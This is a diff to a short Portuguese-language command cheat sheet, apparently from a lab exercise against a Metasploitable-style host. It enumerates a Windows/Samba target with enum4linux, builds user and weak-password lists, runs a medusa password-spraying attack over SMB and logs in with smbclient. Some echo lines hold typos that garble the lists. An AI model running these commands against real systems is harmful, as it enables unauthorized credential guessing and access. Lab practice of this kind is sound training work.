@@ -1,5 +1,18 @@
-# Enumeração - coletar informações detalhadas de hosts Windows e Samba
-1 - enum4linux -a <IP> | tee enum4_output.txt
+# 1 - Enumeração - coletar informações detalhadas de hosts Windows e Samba
+enum4linux -a <IP> | tee enum4_output.txt
 
-# vendo o resultado e buscando usuarios "alvo"
-2 - less enum4_output.txt
+# 2 - vendo o resultado e buscando usuarios "alvo"
+less enum4_output.txt
+
+# 3 - criando a lista de usuarios
+echo -e "user\msfadmin\nservice" > smb_users.txt
+
+# 4 - criando a lista de senhas (as popularmente conhecidas como fracas)
+echo -e "password\n123456\nwelcome123\msfadminnservice" > senhas_spray.txt
+
+# 5 - Ataque Password Spraying
+medusa -h <IP> -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
+
+# 6 - Tendo acesso como administrador ao SMB
+smbclient -L //<IP> -U msfadmin
+
